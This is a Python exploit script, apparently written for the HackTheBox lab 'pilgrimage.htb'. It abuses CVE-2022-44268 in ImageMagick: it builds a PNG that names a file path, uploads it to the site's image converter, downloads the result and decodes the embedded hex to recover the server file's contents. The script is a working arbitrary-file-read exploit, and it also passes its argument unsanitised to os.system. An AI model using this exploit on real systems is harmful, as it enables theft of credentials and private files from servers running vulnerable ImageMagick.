import sys
import os
import time
import requests
from urllib.parse import urlparse, parse_qs

SERVER = "http://pilgrimage.htb"


PNG_GENERATOR_PATH = "./CVE-2022-44268"
PNG_GENERATOR_COMMAND = "cargo run"
PNG_GENERATOR_OUTPUT = "./CVE-2022-44268/image.png"

def log(msg):
    print(f"[+] {msg}")

if __name__ == "__main__":
    if not isinstance(sys.argv[1], str):
        print("Please provide a string as the first argument.")
        sys.exit(1)

    lfi = sys.argv[1]

    log(f"Generating malicious image to leak {lfi}")
    os.system(f"cd {PNG_GENERATOR_PATH} && {PNG_GENERATOR_COMMAND} {lfi}")

    log(f"Uploading malicious image to the server")
    res = requests.post(SERVER, files={"toConvert": open(PNG_GENERATOR_OUTPUT, "rb")}, proxies={"http": "http://localhost:8080"})
    
    redirected = urlparse(res.request.url)
    if "message" not in parse_qs(redirected.query):
        print("Could not compress the image.")
        sys.exit(1)
    compressed_img = parse_qs(redirected.query)["message"][0]
    
    log(f"Downloading compressed image from {compressed_img}")
    res = requests.get(compressed_img)
    with open("compressed.png", "wb") as f:
        f.write(res.content)
    
    log(f"Run magick identify on the compressed image")
    os.system(f"./git-dumper/output/magick identify -verbose ./compressed.png > ./compressed.info")

    log(f"Extracting the compressed image")
    with open("compressed.info", "r") as f:
        data = f.read()
        begin = data.find("Raw profile type: ") + 28
        end = data.find("signature:")
        hex_data = data[begin:end].replace("\n", "")
        print("\n\n")
        print(bytes.fromhex(hex_data))
        with open("leaked", "wb") as f:
            f.write(bytes.fromhex(hex_data))
            log(f"Leaked data written to leaked")

    os.system(f"rm compressed.png compressed.info {PNG_GENERATOR_OUTPUT}")
